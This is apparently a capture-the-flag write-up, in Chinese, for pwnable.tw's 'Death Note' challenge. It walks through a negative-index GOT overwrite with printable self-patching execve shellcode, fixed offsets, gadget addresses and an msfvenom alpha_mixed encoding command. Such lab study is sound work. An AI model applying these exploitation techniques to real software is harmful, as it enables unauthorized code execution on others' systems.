---
tags:
  - out-of-bounds-write
  - alpha-shellcode
  - got-overwrite
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "笔记选择处存在负索引，允许把地址写进 GOT 数组，从而将执行流重定向到存放在可执行堆上的可打印字母数字 shellcode。"
proof-of-concept: no
---

# Death Note — pwnable.tw（300 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10201`
>
> "Write the shellcode on your Death Note."

## 题目概览

一个简单的笔记管理程序（i386，无 PIE，Partial RELRO，**NX 名义上开启但堆可执行**——因为缺少 `PT_GNU_STACK` 头 → 远端老内核上触发 `READ_IMPLIES_EXEC`）。程序允许用户增、查、删存放在全局数组里的笔记。输入内容被过滤为只允许**可打印 ASCII** 字节（0x20–0x7e）。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled           # but heap is executable (READ_IMPLIES_EXEC)
  PIE:      No PIE
```

二进制**未 strip**，符号可见：`add_note`、`show_note`、`del_note`、`read_input`、`read_int`、`is_printable`、`menu`、`main`。

## 还原后的二进制逻辑

```c
// Global note array at 0x804a060
char *note[11];  // note[0]..note[10]

void add_note() {
    char buf[0x50];
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    printf("Name :");
    read_input(buf, 0x50);
    if (!is_printable(buf)) { puts("It must be printable"); exit(-1); }
    note[idx] = strdup(buf);    // heap alloc, stores pointer at note[idx]
    puts("Done !");
}

void show_note() {
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    if (note[idx])
        printf("Name : %s\n", note[idx]);
}

void del_note() {
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    free(note[idx]);            // calls free@plt → jmp *free@got
    note[idx] = 0;
}

int is_printable(char *s) {
    for (int i = 0; i < strlen(s); i++)
        if (s[i] <= 0x1f || s[i] == 0x7f) return 0;
    return 1;
}
```

## 漏洞

### V1 — 负索引越界写/读（主漏洞，可利用）

**根因：** `add_note`、`show_note`、`del_note` 都只检查 `if (idx > 10) exit(0)`，**从不检查 `idx < 0`**。由于 `idx` 是有符号 `int`、数组访问是 `note[idx]`（即 `*(note_base + idx*4)`），负索引会访问 `note` 数组**下方**的内存——正好落在 GOT 上。

```asm
; add_note — the critical store
movl %edx, 0x804a060(,%eax,4)   ; note[idx] = strdup(buf)
; when idx = -19:  0x804a060 + (-19)*4 = 0x804a014 = free@got
```

**相对于 `note` 基址（0x804a060）的关键 GOT 地址：**

| GOT 项 | 地址 | 索引 |
|-----------|---------|-------|
| `read@got` | `0x804a00c` | -21 |
| `printf@got` | `0x804a010` | -20 |
| `free@got` | `0x804a014` | **-19** |
| `strdup@got` | `0x804a018` | -18 |
| `__stack_chk_fail@got` | `0x804a01c` | -17 |
| `puts@got` | `0x804a020` | **-16** |
| `exit@got` | `0x804a024` | -15 |
| `strlen@got` | `0x804a028` | -14 |

**影响：** 在负索引处写入会用 `strdup()` 返回的堆指针覆盖某个 GOT 项。由于堆可执行，该 GOT 项现在指向堆上攻击者控制的 shellcode。

### V2 — 负索引越界读（泄漏）

用负索引调用 `show_note` 会从数组之前的位置读取 `note[idx]`——包括 GOT。由于首次调用后 GOT 项里是已解析的 libc 函数指针，这就能泄漏 libc 地址。

```c
// show_note with idx = -21 reads note[-21] = read@got → leaks &read in libc
```

**影响：** 泄漏 libc 基址以计算 `system()` 地址（某些利用变体使用）。

### V3 — 仅可打印字符过滤约束

```c
int is_printable(char *s) {
    for (int i = 0; i < strlen(s); i++)
        if (s[i] <= 0x1f || s[i] == 0x7f) return 0;  // reject < 0x20 or == 0x7f
    return 1;
}
```

所有 shellcode 字节必须落在 `[0x20, 0x7e]` 范围。这意味着像 `\xcd\x80`（`int 0x80`）、`\x31\xc0`（`xor eax,eax`）、`\x89\xe3`（`mov ebx,esp`）、`\x0b`（`mov eax, 11`）这样的字节都是**禁止的**。shellcode 必须是**可打印/字母数字**的，或者是**自修改**的。

## 关键数据结构

### 内存布局（BSS）

```text
0x804a000  GOT start
0x804a00c  read@got
0x804a010  printf@got
0x804a014  free@got          ← index -19
0x804a018  strdup@got        ← index -18
0x804a01c  __stack_chk_fail@got
0x804a020  puts@got          ← index -16
0x804a024  exit@got          ← index -15
0x804a028  strlen@got        ← index -14
...
0x804a060  note[0]           ← base (index 0)
0x804a064  note[1]
...
0x804a088  note[10]
```

## 利用路径

所有解法都利用 V1（负索引 GOT 覆盖）。差别在于覆盖哪个 GOT 项、采用何种 shellcode 编码策略、以及是否需要泄漏。

---

### 路径 A — 覆盖 `free@got` → 可打印 shellcode（最常见）

**相关题解：** 184、1236、1303、1351、1395、1715、1780、1803、1852、1922、2121、14032、21260、22696、exp.py

**步骤：**

1. **`add_note(-19, shellcode)`**：`strdup(shellcode)` 把可打印 shellcode 复制到堆块 `H`，并把 `H` 写入 `note[-19]` = `free@got`。

2. **`del_note(-19)`**：调用 `free(note[-19])` → `free@plt` → `jmp *free@got` = `jmp H`。传给 `free()` 的参数就是 `H` 本身，因此 **EAX = H**（shellcode 在堆上的自身地址），给 shellcode 提供了一个基址寄存器。

3. shellcode 用自修改代码在运行时产出 `int 0x80`（`\xcd\x80`），因为这些字节不可打印。

**实现可打印 `execve("/bin//sh")` 的 shellcode 策略：**

- **自修改 XOR：** 用 `push eax; pop esi` 取得 shellcode 基址，再执行 `xor word [esi+offset], cx`，其中 `cx` 经过构造，使可打印占位符异或后得到 `\xcd\x80`。exp.py 中的示例：
  ```asm
  push eax ; pop esi          ; esi = shellcode base (H)
  ; ... build cx = 0xc18c via printable sub chain ...
  xor word [esi+0x4b], cx     ; patches placeholder 0x4141 → 0x80cd = int 0x80
  ```

- **自修改 SUB：** 用可打印的 `dl` 值执行 `sub byte [eax+offset], dl`，逐字节减到 `\xcd` 和 `\x80`。

- **栈迁移 + push：** 由于 EAX = 堆地址，把 `esp` 迁移到堆上，用算术在堆上拼出 `int 0x80` 操作码字节并压栈，再就地执行。

- **`inc eax` × 11：** 用 11 条 `inc eax`（操作码 `\x40`，可打印）把 `eax` 构造成 `0xb`（execve 系统调用号）。

**`execve` 的寄存器设置：**
```asm
; eax = 0xb (via inc eax * 11, or push 0x3b; pop eax; xor al, 0x30)
; ebx → "/bin//sh" (push 0x68732f2f; push 0x6e69622f; push esp; pop ebx)
; ecx = 0 (push edx; pop ecx, or inherited from caller)
; edx = 0 (inherited or push ecx; pop edx)
; int 0x80 (self-patched at runtime)
```

**可靠性：** 100%——不涉及 ASLR/随机性。地址固定，结果确定。

---

### 路径 B — 覆盖 `puts@got` → Shellcode

**相关题解：** 184（第一份脚本）、1251、15134

**步骤：**

1. **`add_note(-16, shellcode)`**：用堆上 shellcode 指针覆盖 `puts@got`。

2. 之后任意一次调用 `puts()`（例如打印菜单或 "Done!"）都会跳到 shellcode。

**变体——两段式 shellcode：** 由于大小限制，部分解法把 shellcode 分到两次堆分配里，第一段跳转到第二段。

**注意：** 初始寄存器状态与路径 A 不同——EAX 不含 shellcode 地址，因此部分解法采用不同做法（例如通过栈上的 `pop` gadget 取回 EAX）。

---

### 路径 C — 覆盖 `strlen@got` → ROP/第二段

**相关题解：** 2239、1006

**步骤：**

1. **`add_note(-14, shellcode_stub)`**：覆盖 `strlen@got`。由于 `is_printable()` 会对用户输入调用 `strlen()`，下一次 `add_note` 就会以栈上用户输入缓冲区为参数调用被覆盖的 `strlen@got`。

2. 该 stub 自我修补或迁移栈，去执行第二次 `read_input()` 调用，把不受限制的 shellcode（无过滤）读到已知的可写/可执行地址。

3. 跳到第二段 shellcode → `execve("/bin/sh")`。

**优势：** 完全绕过可打印过滤——只有 stub 需要可打印。

---

### 路径 D — 泄漏 libc + 覆盖 GOT → `system`

**相关题解：** 1384、1715（变体）

**步骤：**

1. **泄漏 libc：** `show_note(-21)` 读取 `note[-21]` = `read@got` → 打印已解析的 `read` 地址 → 计算 libc 基址。

2. **计算 `system` 地址：** `libc_base + system_offset`。

3. **检查 `system` 地址是否可打印**（中间字节）。若不是，则重试或改用其他方案。

4. **用可打印 shellcode 覆盖 `free@got`**，该 shellcode 把另一个函数的 GOT 项改成 `system`，再以 `"/bin/sh"` 为参数调用它。

**变体——`__malloc_hook`：** 部分解法通过负索引（需从 BSS 计算正确索引）覆盖 `__malloc_hook`，再借 `add_note` 中的 `strdup` 触发 `malloc`。

---

### 路径 E — 字母数字编码器 stub

**相关题解：** 1395（msfvenom）、15134

**步骤：**

1. 用 `msfvenom -e x86/alpha_mixed BufferRegister=EDX` 或手工构造的字母数字解码 stub。

2. 该 stub 在运行时解码内联编码的 payload，产出任意 shellcode 字节。

3. 跳转到解码后的 shellcode → `execve("/bin/sh")`。

**示例（msfvenom）：**
```bash
echo '\x83\xC4\x30\xC3' | msfvenom -a x86 --platform linux -p - -e x86/alpha_mixed BufferRegister=EDX
```

## Shellcode 编码技术汇总

| 技术 | `int 0x80` 如何产生 | 是否可打印 | 大小 |
|-----------|---------------------------|------------|------|
| XOR 自修补 | `xor word [esi+off], cx`，占位符 ⊕ cx = `\xcd\x80` | 是 | ~60-77 字节 |
| SUB 自修补 | 用 `sub byte [eax+off], dl` 把可打印字节递减到位 | 是 | ~50-70 字节 |
| 栈迁移 + push | 把 ESP 迁移到堆，以计算出的 dword 压入 `\xcd\x80` | 是 | ~60-80 字节 |
| `inc eax` × 11 | 不负责 int 0x80；经 XOR/SUB 修补 | 是 | ~40-60 字节 |
| msfvenom alpha_mixed | 完整解码 stub | 字母数字 | ~80+ 字节 |
| 两段式（read + jmp） | 第二段不受限制 | 仅 stub | ~30 + 无限 |

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| GOT 覆盖（写） | V1：`add_note` 中的负索引 | 确定性 |
| GOT 读取（泄漏） | V2：`show_note` 中的负索引 | 确定性 |
| 堆上代码执行 | 缺少 `PT_GNU_STACK` → `READ_IMPLIES_EXEC` | 远端确定性 |
| 可打印 shellcode | 自修改 / 编码 | 确定性 |
| Shell | 经 `int 0x80` 的 `execve("/bin//sh")` | 确定性 |

## 偏移

```python
# Binary addresses (no PIE)
note_base   = 0x0804a060
free_got    = 0x0804a014   # index -19
puts_got    = 0x0804a020   # index -16
strlen_got  = 0x0804a028   # index -14
read_got    = 0x0804a00c   # index -21

# Useful gadgets
pop_edi_pop_ebp_ret = 0x08048a8a
read_input          = 0x0804862b
```

## 题解文章

| 文件 | 主要路径 | GOT 目标 | Shellcode 技术 | 备注 |
|------|-------------|------------|---------------------|-------|
| `184.md` | A/B | puts@got (-16) | 字母数字，两段式 + jno 跳转 | 两块堆，sc1→sc2 |
| `196.md` | 自定义 | 不适用 | 堆喷射 + 可打印 stub | 222 次暴力分配 |
| `1006.md` | C | strlen@got (-14) | Stub + ROP 到 read_input 读第二段 | 绕过可打印过滤 |
| `1236.md` | A | free@got (-19) | XOR 自修补 + `inc eax`×11 | 紧凑、直接 |
| `1251.md` | A | puts@got (-16) | 字母数字（pwntools asm） | 自修改 xor+xor |
| `1303.md` | A | free@got (-19) | 栈迁移到堆，push int 0x80 | 巧妙的栈迁移 |
| `1351.md` | A | free@got (-19) | 栈迁移 + xor ax 序列 | 使用 `push edi; pop esp` |
| `1384.md` | D | __malloc_hook | 经 show 泄漏 libc + 堆 shellcode | 用负索引 show 泄漏 |
| `1395.md` | E | free@got (-19) | msfvenom alpha_mixed 编码器 | 一行式 shellcode |
| `1715.md` | A | free@got (-19) | XOR 自修补，sub 链构造 eax=0xb | 干净的模块化写法 |
| `1780.md` | A | free@got (-19) | XOR + sub byte，用 `jno` 做条件流 | 把 /bin/sh 存进 note[0] |
| `1803.md` | A | free@got (-19) | AND+SUB 链构造 `int 0x80` 字节 | Ruby 求解器 |
| `1852.md` | A | free@got (-19) | 经 `pop esp` 栈迁移 | 把 `int 0x80` 压到堆上 |
| `1922.md` | A | free@got (-19) | XOR `[ebx+off]` 自修补 | 经 `al=0x80` 修补 2 字节 |
| `1980.md` | A | puts@got (-16) | SUB 字节链构造 cd/80 | 单独存放 /bin/sh |
| `2121.md` | A | free@got (-19) | XOR + dec ecx 链做自修补 | 使用 `esi+ecx*2` 寻址 |
| `2239.md` | C | strlen@got (-14) | Stub → 泄漏堆 → ROP → 读第二段 | 最复杂，两阶段 |
| `10128.md` | A | free@got (-19) | DEC+XOR 逐字节自修补 | 把 /bin/sh 存进 note[0] |
| `14032.md` | A | free@got (-19) | 用 `[eax+off]` 做 XOR 自修补 | 紧凑，`\x61\x61` = `int 0x80` 修补 |
| `15134.md` | E | puts@got (-16) | 字母数字解码器（`sub` + `xor`） | 逐字节编码禁用字节 |
| `21260.md` | A | free@got (-19) | SUB 链：`sub [esi+off], eax` | 对 `cd80` 字做两次 sub |
| `22696.md` | A | free@got (-19) | 栈迁移 + XOR ax 链 | 附 NASM 源码 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用利用脚本（可打印自修补 execve shellcode） |
| `desc.txt` | 题目描述 |
| `artifacts/death_note` | 原始题目二进制（i386，未 strip） |
| `solution/*.md` | 社区题解文章（141 个解法） |
